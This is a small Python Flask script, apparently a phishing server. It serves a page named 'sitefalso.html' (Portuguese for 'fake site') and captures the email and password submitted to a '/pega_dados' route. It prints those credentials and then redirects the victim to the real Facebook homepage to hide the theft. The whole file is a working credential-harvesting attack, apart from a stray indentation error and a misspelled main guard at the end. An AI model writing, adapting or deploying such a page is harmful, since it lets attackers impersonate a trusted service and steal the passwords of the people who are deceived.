from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def pagina_inicial(): 
    return render_template("sitefalso.html")

@app.route("/pega_dados", methods=['POST'])
def pega_dados():
    email = request.form['email']
    senha = request.form['pass']
    print(f"E-MAIL: {email} , SENHA: {senha}")
    return redirect("https://www.facebook.com/?locale=pt_BR")

 if __name__ =='_main_':
    app.run(host="0.0.0.0", port="8080")



